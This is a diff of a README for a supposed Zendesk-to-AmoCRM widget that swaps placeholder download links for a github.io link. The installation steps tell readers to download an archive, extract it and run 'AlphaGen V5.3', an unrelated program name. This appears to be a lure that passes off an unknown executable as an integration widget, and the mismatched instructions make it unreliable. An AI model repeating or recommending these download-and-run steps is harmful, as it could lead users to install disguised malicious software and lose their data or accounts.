@@ -2,13 +2,13 @@
 
 Integrate Zendesk with AmoCRM using the Zendesk Widget — view tickets, create tasks, and sync customer support data directly in your CRM interface.
 
-[![Download](https://img.shields.io/badge/Download-Zendesk_Widget_AmoCRM-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Zendesk_Widget_AmoCRM-blueviolet)](https://zendesk-widget-amocrm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://zendesk-widget-amocrm.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to enable the Zendesk widget  
 4. ✅ In AmoCRM, go to `Settings > Integrations > Zendesk` and connect your Zendesk account via OAuth or API key
